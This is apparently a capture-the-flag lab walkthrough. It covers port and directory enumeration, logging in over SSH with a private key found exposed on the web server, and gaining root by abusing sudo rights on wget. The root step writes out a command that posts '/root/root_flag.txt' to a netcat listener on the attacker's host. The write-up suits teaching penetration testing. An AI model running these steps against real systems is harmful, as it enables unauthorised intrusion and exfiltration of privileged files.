question one: User flag

i first started with a nmap scan to the target

nmap -A -sC 10.10.28.198

![](/images/wg.png)

there was 2 open ports
22 ssh and 80 http

lets go see the website this machine is hosting, i type the machine ip into firefox and i get a apache default page

![](/images/wg1.png)

i checked the page source and i saw a possible username "jessie"

![](/images/wg2.png)

i needed to do more enurmation so i used gobuster to find hidden directories in the website

![](/images/cy3.png)

gobuster dir -u http://[ip]/ -w /usr/share/wordlist/rockyou.txt

it found sitemap so i went to check it out

![](/images/cy4.png)

there was nothing in here that was useful so i did more enumeration on sitemap with gobuster but i didnt find anything with gobuster so i used dirb to find hidden directories

dirb http://[ip]/sitemap

![](/images/wg5.png)

it found .ssh within sitemap its pretty interesting lets check it out

![](/images/wg6.png)

it shows the ssh key we can copy the ssh private key to login without a password

![](/images/wg7.png)

lets copy it into a text file and change the permission to 600 because it wont work without a specific permision

nano id_rsa
chmod 600 id_rsa

now we can try to login within ssh

ssh jessie@[ip] -i id_rsa

![](/images/wg8.png)

the user.txt file is in the Documents file

question two: Root flag

time to get root flag, lets start to see what we can run as root without permisions

sudo -l 

![](/images/wg9.png)

we can run wget as root so lets go to the website gtfobins to see what we can do with wget https://gtfobins.github.io/

we look at wget within sudo and we find this

![](/images/wg10.png)

it seems we can set up netcat and we be listining for traffic and we will send data from the victim computer to the hacker computer

we will be setting up netcat 

netcat -lvnp 4444

![](/images/wg13.png)

once that is set up we can send the file to our machine

sudo wget --post-file=/root/root_flag.txt http://[host ip]:4444

![](/images/wg12.png)

once we send it we will recieve it through our netcat and we will see the flag

![](/images/wg14.png)

you have have got the root flag! we did ittt. thank you for reading 


